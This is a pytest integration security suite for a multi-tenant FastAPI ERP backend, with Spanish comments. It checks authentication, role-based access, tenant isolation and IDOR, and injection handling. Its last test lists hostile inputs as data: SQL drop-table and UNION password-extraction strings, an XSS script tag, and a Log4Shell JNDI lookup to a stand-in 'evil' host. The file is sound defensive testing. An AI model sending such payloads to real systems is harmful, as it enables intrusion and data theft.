"""T-13 · Pruebas de seguridad de integración (OWASP Top 10 aplicable).

Cubre:
- Autenticación: sin token → 401; token inválido → 401.
- Control de acceso (RBAC): usuario sin permiso → 403 en escritura.
- Aislamiento entre tenants (IDOR): B no ve ni accede a datos de A;
  los listados de organización están acotados al propio tenant.
- Escritura cruzada bloqueada: B no puede referenciar entidades de A.
- Inyección (SQLi/XSS): payloads se tratan como datos, no se ejecutan.

Usa SQLite en memoria con StaticPool (mismo patrón que test_process_flows).
"""
from __future__ import annotations

import json
import os
from datetime import UTC, datetime, timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool

from app.core.config import get_settings
from app.core.database import Base, get_db, init_models
from app.modules.identity_access import service as identity_service
from app.modules.identity_access.models import UserRole
from app.modules.licensing import service as licensing_service
from app.modules.organization.models import Installation, Tenant
from app.modules.setup.api import SetupRequest, _bootstrap_roles, initialize

_ENGINE = _FACTORY = _APP = _CLIENT = None


def _import_license(db: Session) -> None:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

    key = Ed25519PrivateKey.generate()
    pub = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode("utf-8")
    inst = db.execute(select(Installation).limit(1)).scalars().first()
    now = datetime.now(UTC)
    payload = {
        "issuer": "K", "license_id": "LIC-SEC", "installation_id": inst.installation_uuid,
        "customer_id": "C1", "contract_id": "C1", "company_tax_id": "J-12345678-9",
        "period_start": (now - timedelta(days=30)).isoformat(),
        "period_end": (now + timedelta(days=120)).isoformat(),
        "critical_warning_start": (now + timedelta(days=180)).isoformat(),
        "read_only_start": (now + timedelta(days=200)).isoformat(),
        "entitlements": {"companies": 1, "users": 25, "modules": ["*"]},
        "minimum_version": "1.0.0", "kid": "kontrol-lic-2026-01",
    }
    sig = key.sign(json.dumps(payload, sort_keys=True, ensure_ascii=False).encode("utf-8")).hex()
    os.environ["KONTROL_LICENSE_PUBLIC_KEY_PEM"] = pub
    get_settings.cache_clear()
    try:
        licensing_service.import_license(db, payload=payload, signature_hex=sig, source="MANUAL")
    finally:
        os.environ.pop("KONTROL_LICENSE_PUBLIC_KEY_PEM", None)
        get_settings.cache_clear()


@pytest.fixture(scope="module", autouse=True)
def _app_client():
    global _ENGINE, _FACTORY, _APP, _CLIENT
    engine = create_engine(
        "sqlite+pysqlite:///:memory:", future=True,
        connect_args={"check_same_thread": False}, poolclass=StaticPool,
    )
    init_models()
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine, class_=Session, expire_on_commit=False)
    import app.core.database as dm

    dm._engine = engine  # type: ignore[attr-defined]
    dm._SessionLocal = factory  # type: ignore[attr-defined]

    db = factory()
    initialize(db, SetupRequest(
        tenant_code="DEMO", tenant_name="Empresa Demo", company_code="D1",
        company_legal_name="Demo C.A.", company_rif="J-12345678-9",
        admin_username="admin", admin_password="Kontrol2026Segura!",
    ))
    _import_license(db)

    # Tenant B aislado (mismo installation, otro tenant): usuario con rol ADMIN
    # (el aislamiento se sigue aplicando por tenant_id en las validaciones de propiedad).
    inst = db.execute(select(Installation).limit(1)).scalars().first()
    tenant_b = Tenant(installation_id=str(inst.id), code="DEMO2", name="Empresa B",
                      plan="MONO_COMPANY", status="ACTIVE")
    db.add(tenant_b)
    db.flush()
    user_b = identity_service.create_user(db, tenant_id=str(tenant_b.id), username="admin2",
                                          email="admin2@b.com", password="Kontrol2026Segura!",
                                          created_by=None)
    admin_role = _bootstrap_roles(db, str(tenant_b.id), str(user_b.id))
    db.add(UserRole(user_id=str(user_b.id), role_id=str(admin_role.id), company_id=None))
    db.commit()
    db.close()

    from app.main import create_app

    app = create_app()

    def _override_get_db():
        d = factory()
        try:
            yield d
        finally:
            d.close()

    app.dependency_overrides[get_db] = _override_get_db
    _ENGINE, _FACTORY, _APP = engine, factory, app
    _CLIENT = TestClient(app)
    yield _CLIENT


def _login(tenant: str, username: str, password: str = "Kontrol2026Segura!") -> dict:
    r = _CLIENT.post("/api/v1/auth/login", json={
        "tenant_code": tenant, "username": username, "password": password,
    })
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def _auth() -> dict:
    return _login("DEMO", "admin")


def _auth_b() -> dict:
    return _login("DEMO2", "admin2")


def _create_party_customer(h: dict, code: str = "C-SEC-01") -> str:
    r = _CLIENT.post("/api/v1/maestros/terceros", headers=h,
                     json={"code": code, "name": f"Cliente {code}", "roles": ["CLIENTE"]})
    assert r.status_code == 200, r.text
    return r.json()["id"]


def _create_order(h: dict, customer_id: str, code: str = "OV-SEC-01") -> str:
    r = _CLIENT.post("/api/v1/sales/orders", headers=h,
                     json={"code": code, "customer_id": customer_id, "margin": None, "currency": "VED"})
    assert r.status_code == 200, r.text
    return r.json()["id"]


# --------------------------------------------------------------------------- #
# Autenticación
# --------------------------------------------------------------------------- #
def test_unauthenticated_requests_rejected():
    assert _CLIENT.get("/api/v1/sales/orders").status_code == 401
    assert _CLIENT.get("/api/v1/organization/companies").status_code == 401
    assert _CLIENT.get("/api/v1/maestros/terceros").status_code == 401
    assert _CLIENT.post("/api/v1/sales/orders", json={}).status_code == 401
    assert _CLIENT.post("/api/v1/inventory/movements", json={}).status_code == 401


def test_invalid_token_rejected():
    headers = {"Authorization": "Bearer not.a.valid.token"}
    assert _CLIENT.get("/api/v1/sales/orders", headers=headers).status_code == 401


# --------------------------------------------------------------------------- #
# Control de acceso por rol (RBAC)
# --------------------------------------------------------------------------- #
def test_write_without_permission_returns_403():
    created = _CLIENT.post("/api/v1/users", headers=_auth(), json={
        "username": "sinroles", "email": "sr@x.com", "password": "Clave2026Segura!",
        "must_change_password": True,
    })
    assert created.status_code == 200, created.text
    h = _login("DEMO", "sinroles", "Clave2026Segura!")
    r = _CLIENT.post("/api/v1/sales/orders", headers=h, json={
        "code": "OV-NO", "customer_id": "00000000-0000-0000-0000-000000000000",
        "margin": None, "currency": "VED",
    })
    assert r.status_code == 403, r.text


# --------------------------------------------------------------------------- #
# Aislamiento entre tenants (IDOR)
# --------------------------------------------------------------------------- #
def test_tenant_isolation_lists_empty():
    a = _auth()
    cust = _create_party_customer(a)
    _create_order(a, cust, "OV-SEC-ISO")

    b = _auth_b()
    assert _CLIENT.get("/api/v1/sales/orders", headers=b).json()["items"] == []
    assert _CLIENT.get("/api/v1/sales/invoices", headers=b).json()["items"] == []
    assert _CLIENT.get("/api/v1/maestros/terceros", headers=b).json()["items"] == []
    assert _CLIENT.get("/api/v1/inventory/movements", headers=b).json()["items"] == []


def test_tenant_isolation_idor_detail_404():
    a = _auth()
    cust = _create_party_customer(a)
    order_id = _create_order(a, cust, "OV-SEC-IDOR")

    b = _auth_b()
    # B (con permisos) intenta leer la orden de A por ID → 404 (no está en su tenant)
    assert _CLIENT.get(f"/api/v1/sales/orders/{order_id}", headers=b).status_code == 404
    # B intenta agregar una línea a la orden de A → 404 (SALES_ORDER_NOT_FOUND)
    assert _CLIENT.post(f"/api/v1/sales/orders/{order_id}/lines", headers=b,
                        json={"product_id": "00000000-0000-0000-0000-000000000000",
                              "quantity": 1, "unit_price": 10.0, "discount": 0, "needs_inventory": True}
                        ).status_code == 404


def test_cross_tenant_write_blocked():
    a = _auth()
    cust = _create_party_customer(a, "C-SEC-X")
    b = _auth_b()
    r = _CLIENT.post("/api/v1/sales/orders", headers=b, json={
        "code": "OV-X", "customer_id": cust, "margin": None, "currency": "VED",
    })
    assert r.status_code == 404, r.text


def test_org_tenant_isolation():
    a = _auth()
    companies = _CLIENT.get("/api/v1/organization/companies", headers=a).json()
    assert len(companies) == 1
    company_a = companies[0]["id"]

    wh = _CLIENT.post("/api/v1/organization/warehouses", headers=a,
                      json={"company_id": company_a, "branch_id": None, "code": "ALM-SEC", "name": "Almacén Sec"})
    assert wh.status_code == 200, wh.text

    b = _auth_b()
    assert _CLIENT.get("/api/v1/organization/companies", headers=b).json() == []
    assert _CLIENT.get(f"/api/v1/organization/warehouses?company_id={company_a}", headers=b).json() == []

    r = _CLIENT.post("/api/v1/organization/warehouses", headers=b,
                     json={"company_id": company_a, "branch_id": None, "code": "ALM-X", "name": "X"})
    assert r.status_code == 404, r.text


# --------------------------------------------------------------------------- #
# Inyección (SQLi / XSS)
# --------------------------------------------------------------------------- #
def test_injection_payloads_treated_as_data():
    a = _auth()
    payloads = [
        "ACME'; DROP TABLE parties;--",
        "<script>alert(1)</script>",
        "1 OR 1=1",
        "' UNION SELECT password FROM users--",
        "${jndi:ldap://evil}",
    ]
    for i, payload in enumerate(payloads):
        r = _CLIENT.post("/api/v1/maestros/terceros", headers=a, json={
            "code": f"C-INJ-{i}", "name": payload, "roles": ["CLIENTE"],
        })
        assert r.status_code in (200, 400), (payload, r.text)

    for payload in payloads:
        r = _CLIENT.get(f"/api/v1/maestros/terceros?q={payload}", headers=a)
        assert r.status_code == 200, r.text

    b = _auth_b()
    r = _CLIENT.get("/api/v1/maestros/terceros?q=%27%20OR%201%3D1--", headers=b)
    assert r.status_code == 200
    assert r.json()["items"] == []
